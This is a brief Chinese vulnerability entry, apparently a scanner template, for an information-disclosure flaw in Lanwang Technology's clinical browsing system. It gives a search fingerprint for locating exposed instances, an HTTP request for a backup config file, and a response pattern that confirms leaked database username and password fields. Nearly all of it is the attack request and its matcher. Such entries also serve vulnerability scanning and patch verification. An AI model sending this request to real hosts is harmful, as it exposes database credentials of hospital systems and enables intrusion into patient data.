# 蓝网科技临床浏览系统config信息泄露漏洞

蓝网科技临床浏览系统config ｜ 信息泄露 ｜ —
- **指纹**：`body="蓝网科技股份有限公司"`
- **请求**：`GET /config/config%20bak.txt HTTP/1.1`
- **响应特征**：200 ^(?=.*?DBPassword)(?=.*?DBUserName).*?$